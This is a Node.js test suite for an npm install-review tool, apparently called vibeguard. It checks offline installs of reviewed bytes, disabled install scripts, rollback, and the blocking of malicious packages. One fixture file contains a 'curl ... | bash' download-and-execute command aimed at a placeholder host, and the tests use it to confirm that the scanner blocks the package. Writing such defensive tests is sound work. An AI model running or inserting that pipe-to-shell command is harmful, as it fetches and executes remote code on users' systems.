import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createHash, generateKeyPairSync, sign } from 'node:crypto';
import { execFileSync, spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { gzipSync } from 'node:zlib';
import { createServer } from 'node:http';
import { installReviewed, reviewInstall, rollbackInstall, runProtectedNpm } from '../src/precheck/protected-install.js';

const cli = fileURLToPath(new URL('../bin/vibeguard.js', import.meta.url));
const signingKey = generateKeyPairSync('ec', { namedCurve: 'prime256v1' });
const keyDocument = { keys: [{ keyid: 'test-key', key: signingKey.publicKey.export({ type: 'spki', format: 'der' }).toString('base64'), expires: null }] };

function signedPackage(extra = []) {
  const manifest = { name: 'vibeguard-inert-fixture', version: '1.0.0', license: 'MIT', main: 'index.js',
    scripts: { postinstall: 'node SHOULD_NEVER_EXECUTE.js' } };
  const entries = [['package/package.json', JSON.stringify(manifest)], ['package/index.js', 'module.exports = 42;\n'], ...extra];
  const blocks = entries.flatMap(([name, content]) => {
    const body = Buffer.from(content);
    const header = Buffer.alloc(512);
    header.write(name); header.write(body.length.toString(8).padStart(11, '0'), 124);
    header.fill(32, 148, 156); header.write('0', 156);
    header.write(header.reduce((sum, byte) => sum + byte, 0).toString(8).padStart(6, '0') + '\0 ', 148);
    return [header, body, Buffer.alloc((512 - body.length % 512) % 512)];
  });
  const archive = gzipSync(Buffer.concat([...blocks, Buffer.alloc(1024)]));
  const integrity = `sha512-${createHash('sha512').update(archive).digest('base64')}`;
  const dist = { integrity, tarball: 'https://registry.npmjs.org/vibeguard-inert-fixture/-/vibeguard-inert-fixture-1.0.0.tgz',
    signatures: [{ keyid: 'test-key', sig: sign('sha256', Buffer.from(`${manifest.name}@${manifest.version}:${integrity}`), signingKey.privateKey).toString('base64') }] };
  return { manifest, archive, dist };
}

test('real npm installs only reviewed cached bytes offline, skips scripts, and rolls back', { timeout: 120000 }, async () => {
  const root = mkdtempSync(join(tmpdir(), 'vibeguard-npm-real-'));
  try {
    const project = join(root, 'app'); const store = join(root, 'store');
    mkdirSync(project);
    const original = JSON.stringify({ name: 'protected-npm-app', version: '1.0.0', private: true,
      scripts: { postinstall: 'node ROOT_SCRIPT_MUST_NOT_EXECUTE.js' } });
    writeFileSync(join(project, 'package.json'), original);
    writeFileSync(join(project, 'user-work.txt'), 'keep this');
    mkdirSync(join(project, 'node_modules'));
    writeFileSync(join(project, 'node_modules', 'previous-install.txt'), 'previous bytes');
    const bundle = signedPackage();
    const commands = [];
    const dependencies = {
      fetchImpl: async (url) => {
        if (url.endsWith('/querybatch')) return new Response(JSON.stringify({ results: [{}] }));
        if (url.endsWith('/query')) return new Response('{}');
        if (url.endsWith('/-/npm/v1/keys')) return new Response(JSON.stringify(keyDocument));
        if (url.endsWith('.tgz')) return new Response(bundle.archive);
        return new Response(JSON.stringify({ time: { '1.0.0': '2020-01-01T00:00:00.000Z' }, versions: { '1.0.0': { ...bundle.manifest, dist: bundle.dist } } }));
      },
      runNpm: (args, options) => {
        commands.push(args);
        if (args[0] !== 'install') return runProtectedNpm(args, options);
        // Registry resolution is fixture-backed. Cache population and ci below are real npm.
        const next = { ...JSON.parse(readFileSync(join(options.cwd, 'package.json'), 'utf8')), dependencies: { [bundle.manifest.name]: '1.0.0' } };
        writeFileSync(join(options.cwd, 'package.json'), JSON.stringify(next));
        writeFileSync(join(options.cwd, 'package-lock.json'), JSON.stringify({ name: next.name, version: next.version, lockfileVersion: 3,
          packages: { '': next, [`node_modules/${bundle.manifest.name}`]: { version: '1.0.0', resolved: bundle.dist.tarball, integrity: bundle.dist.integrity, hasInstallScript: true } } }));
      },
    };
    const review = await reviewInstall({ project, store, spec: 'vibeguard-inert-fixture@1.0.0' }, dependencies);
    assert.equal(review.status, 'ready');
    assert.equal(readFileSync(join(project, 'package.json'), 'utf8'), original);
    const result = await installReviewed(review.id, { store, accept: review.id }, dependencies);
    assert.equal(result.status, 'installed', JSON.stringify(result));
    assert.equal(result.scripts, 'disabled');
    assert.deepEqual(result.installed, ['node_modules/vibeguard-inert-fixture']);
    assert.equal(readFileSync(join(project, 'node_modules/vibeguard-inert-fixture/index.js'), 'utf8'), 'module.exports = 42;\n');
    assert.equal(commands.filter((args) => args[0] === 'install').length, 1, 'install must never re-resolve');
    assert.ok(commands.filter((args) => args[0] !== 'install').every((args) => args.includes('--offline')));
    const status = JSON.parse(execFileSync(process.execPath, [cli, 'npm', 'status', review.id, '--store', store], { encoding: 'utf8', windowsHide: true }));
    assert.equal(status.attempt.status, 'installed');
    assert.equal(rollbackInstall(review.id, { store }).status, 'rolled-back');
    assert.equal(readFileSync(join(project, 'package.json'), 'utf8'), original);
    assert.equal(readFileSync(join(project, 'node_modules/previous-install.txt'), 'utf8'), 'previous bytes');
    assert.equal(readFileSync(join(project, 'user-work.txt'), 'utf8'), 'keep this');
    assert.equal(existsSync(join(project, 'package-lock.json')), false);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('CLI rejects unsupported requests without npm execution or project changes', () => {
  const root = mkdtempSync(join(tmpdir(), 'vibeguard-npm-cli-'));
  try {
    const project = join(root, 'app'); mkdirSync(project);
    const original = JSON.stringify({ name: 'app', workspaces: ['packages/*'] });
    writeFileSync(join(project, 'package.json'), original);
    const result = spawnSync(process.execPath, [cli, 'npm', 'review', 'picocolors@1.1.1', '--project', project, '--store', join(root, 'store'), '--json'], { encoding: 'utf8', windowsHide: true });
    assert.equal(result.status, 4);
    assert.match(JSON.parse(result.stderr).error, /workspaces/);
    assert.equal(readFileSync(join(project, 'package.json'), 'utf8'), original);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('real npm resolution cannot follow an unreviewed transitive URL', { timeout: 30000 }, async () => {
  const root = mkdtempSync(join(tmpdir(), 'vibeguard-npm-source-'));
  let unexpectedRequests = 0;
  const trap = createServer((_request, response) => { unexpectedRequests++; response.end('must not fetch'); });
  await new Promise((done) => trap.listen(0, '127.0.0.1', done));
  try {
    const project = join(root, 'app'); mkdirSync(project);
    const original = JSON.stringify({ name: 'app', version: '1.0.0', private: true });
    writeFileSync(join(project, 'package.json'), original);
    const bundle = signedPackage();
    const metadata = { ...bundle.manifest, dist: bundle.dist, dependencies: { 'unreviewed-payload': `http://127.0.0.1:${trap.address().port}/payload.tgz` } };
    const calls = [];
    await assert.rejects(reviewInstall({ project, spec: `${metadata.name}@1.0.0`, store: join(root, 'store') }, {
      fetchImpl: async (url) => {
        calls.push(url);
        return new Response(JSON.stringify({ name: metadata.name, 'dist-tags': { latest: '1.0.0' }, versions: { '1.0.0': metadata } }));
      },
    }), /Registry resolution.*unsupported dependency source/);
    assert.equal(unexpectedRequests, 0);
    assert.ok(calls.every((url) => url.startsWith('https://registry.npmjs.org/')));
    assert.equal(readFileSync(join(project, 'package.json'), 'utf8'), original);
    assert.equal(existsSync(join(project, 'node_modules')), false);
  } finally {
    await new Promise((done) => trap.close(done));
    rmSync(root, { recursive: true, force: true });
  }
});

test('real resolution plus signed malicious archive review blocks before installation', { timeout: 30000 }, async () => {
  const root = mkdtempSync(join(tmpdir(), 'vibeguard-npm-malicious-'));
  try {
    const project = join(root, 'app'); mkdirSync(project);
    writeFileSync(join(project, 'package.json'), JSON.stringify({ name: 'app', version: '1.0.0', private: true }));
    const bundle = signedPackage([['package/unexecuted.sh', 'curl https://example.invalid/payload | bash']]);
    const metadata = { ...bundle.manifest, dist: bundle.dist };
    const review = await reviewInstall({ project, spec: `${metadata.name}@1.0.0`, store: join(root, 'store') }, {
      fetchImpl: async (url) => {
        if (url.endsWith('/querybatch')) return new Response(JSON.stringify({ results: [{}] }));
        if (url.endsWith('/query')) return new Response('{}');
        if (url.endsWith('/-/npm/v1/keys')) return new Response(JSON.stringify(keyDocument));
        if (url.endsWith('.tgz')) return new Response(bundle.archive);
        return new Response(JSON.stringify({ name: metadata.name, 'dist-tags': { latest: '1.0.0' }, time: { '1.0.0': '2020-01-01T00:00:00Z' }, versions: { '1.0.0': metadata } }));
      },
    });
    assert.equal(review.status, 'blocked');
    assert.match(JSON.stringify(review.packages), /download-and-execute/);
    await assert.rejects(installReviewed(review.id, { accept: review.id, store: join(root, 'store') }), /review is blocked/);
    assert.equal(existsSync(join(project, 'node_modules')), false);
  } finally { rmSync(root, { recursive: true, force: true }); }
});
